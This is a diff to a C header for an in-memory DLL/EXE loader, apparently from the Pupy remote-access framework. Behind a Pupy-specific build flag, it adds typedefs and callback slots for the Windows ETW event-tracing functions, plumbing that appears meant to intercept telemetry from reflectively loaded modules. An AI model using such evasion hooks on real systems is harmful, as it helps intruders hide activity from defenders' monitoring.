@@ -62,6 +62,36 @@ typedef LPVOID (CALLBACK *CustomLoadResource)(HMEMORYMODULE module, HRSRC resour
 typedef FARPROC (CALLBACK *CustomGetProcAddress)(HMODULE, LPCSTR);
 typedef void (CALLBACK *CustomFreeLibraryFunc)(HMODULE);
 
+#ifdef _PUPY_PRIVATE_WS2_32
+typedef NTSTATUS (CALLBACK *CustomEtwRegister) (
+    LPCGUID            ProviderId,
+    PVOID EnableCallback,
+    PVOID              CallbackContext,
+    PULONGLONG         RegHandle
+);
+
+typedef ULONG (CALLBACK *CustomEtwEventWrite) (
+    ULONGLONG RegHandle,
+    PVOID EventDescriptor,
+    ULONG UserDataCount,
+    PVOID UserData
+);
+
+typedef ULONG (CALLBACK *CustomEtwEventWriteFull) (
+    ULONGLONG RegHandle,
+    PVOID EventDescriptor,
+    USHORT EventProperty,
+    LPCGUID ActivityId,
+    LPCGUID RelatedActivityId,
+    ULONG UserDataCount,
+    PVOID UserData
+);
+
+typedef NTSTATUS (CALLBACK *CustomEtwUnregister) (
+    ULONGLONG RegHandle
+);
+#endif
+
 /**
  * Load EXE/DLL from memory location.
  *
@@ -95,6 +125,13 @@ typedef struct {
     CustomFindResourceExW systemFindResourceExW;
     CustomSizeofResource systemSizeofResource;
     CustomLoadResource systemLoadResource;
+
+#ifdef _PUPY_PRIVATE_WS2_32
+    CustomEtwRegister systemEtwRegister;
+    CustomEtwEventWrite systemEtwEventWrite;
+    CustomEtwEventWriteFull systemEtwEventWriteFull;
+    CustomEtwUnregister systemEtwUnregister;
+#endif
 } DL_CALLBACKS, *PDL_CALLBACKS;
 
 typedef enum {
